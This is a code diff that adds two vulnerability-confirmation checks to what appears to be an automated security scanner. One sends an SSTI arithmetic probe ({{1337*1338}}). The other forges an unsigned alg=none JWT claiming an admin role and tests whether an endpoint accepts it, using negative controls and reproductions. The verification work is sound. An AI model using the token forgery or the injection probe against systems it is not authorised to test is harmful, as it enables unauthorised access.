@@ -80,6 +80,64 @@ _SENSITIVE_KEY = _re.compile(
     r'access[_-]?token|private[_-]?key|credit[_-]?card|card[_-]?number|cvv|pan)"\s*:')
 
 
+def run_ssti_oracle(runner, hyp, reproductions: int = 2) -> OracleVerdict:
+    # Arithmetic differential: {{1337*1338}} evaluates to 1788906 only if the template engine runs it.
+    return _marker_oracle(runner, hyp, vuln_class="SSTI",
+                          probe_value="{{1337*1338}}", control_value="1337*1338",
+                          signature="1788906", reproductions=reproductions)
+
+
+_JWT_CANARY = "rampart-admin-canary"
+
+
+def _jwt_forge_none(sub: str) -> str:
+    import base64 as _b64
+    import json as _json
+
+    def seg(obj):
+        return _b64.urlsafe_b64encode(_json.dumps(obj).encode()).rstrip(b"=").decode()
+    return seg({"alg": "none", "typ": "JWT"}) + "." + seg({"sub": sub, "role": "admin"}) + "."
+
+
+def run_jwt_oracle(runner, hyp, reproductions: int = 2) -> OracleVerdict:
+    """JWT accepted without signature verification (alg=none): forge an identity and get in,
+    while the endpoint still rejects an unauthenticated request (so the defect is signature
+    verification, not a missing auth check)."""
+    path = hyp["endpoint_path"]
+    hid = hyp.get("id")
+    forged = _jwt_forge_none(_JWT_CANARY)
+    probe = runner.get(path, session=None, headers={"Authorization": f"Bearer {forged}"},
+                       payload_class="boundary-probe",
+                       rationale="JWT probe: forged alg=none token with attacker-chosen identity",
+                       hypothesis_id=hid, summary="jwt forged")
+    unauth = runner.get(path, session=None, payload_class="benign-read",
+                        rationale="negative control: no token", hypothesis_id=hid, summary="jwt unauth")
+    if not probe.executed or not unauth.executed:
+        return OracleVerdict(False, "JWT", reasons=["probe blocked by policy"],
+                             evidence=_collect(probe, unauth))
+    accepted = probe.status == 200 and _JWT_CANARY in (probe.body or "")
+    auth_enforced = unauth.status in (401, 403)
+    reasons, fp = [], []
+    reasons.append(("PASS" if accepted else "FAIL")
+                   + f": server accepted a forged alg=none token as '{_JWT_CANARY}' (status {probe.status})")
+    reasons.append(("PASS" if auth_enforced else "FAIL")
+                   + f": unauthenticated request is rejected (status {unauth.status})")
+    decisive = accepted and auth_enforced
+    repro_ok = 0
+    if decisive:
+        for i in range(reproductions):
+            r = runner.get(path, session=None, headers={"Authorization": f"Bearer {forged}"},
+                           payload_class="boundary-probe", rationale=f"reproduction #{i+1}",
+                           hypothesis_id=hid, summary=f"jwt repro {i+1}")
+            if r.executed and r.status == 200 and _JWT_CANARY in (r.body or ""):
+                repro_ok += 1
+        fp.append(f"reproduced {repro_ok}/{reproductions} times from clean requests")
+    return OracleVerdict(validated=decisive and repro_ok >= reproductions, vuln_class="JWT",
+                         reasons=reasons, false_positive_checks=fp, reproductions=repro_ok,
+                         evidence=_collect(probe, unauth),
+                         controls={"probe_status": probe.status, "unauth_status": unauth.status})
+
+
 def run_bfla_oracle(runner, sessions, hyp, reproductions: int = 2) -> OracleVerdict:
     """Broken function-level authorization: a low-privilege principal reaches a privileged
     function (200 + privileged data) while the function still enforces authentication."""
